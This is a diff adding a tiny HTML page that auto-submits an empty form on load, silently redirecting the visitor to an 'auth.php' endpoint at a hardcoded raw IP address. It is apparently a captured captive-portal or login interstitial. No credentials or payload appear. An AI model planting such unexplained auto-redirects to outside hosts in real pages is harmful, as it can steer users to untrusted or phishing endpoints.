@@ -1,0 +1,18 @@
+<html>
+<head><title>...</title></head>
+<body>
+<noscript>
+<center><b>JavaScript required. Enable JavaScript to continue.</b></center>
+</noscript>
+<center>If you are not redirected in a few seconds, click 'continue' below<br>
+<form name="redirect" action="http://61.7.135.181/auth.php" method="post">
+<input type="submit" value="continue">
+</form>
+<script language="JavaScript">
+<!--
+   document.redirect.submit();
+//-->
+</script></center>
+</body>
+</html>
+
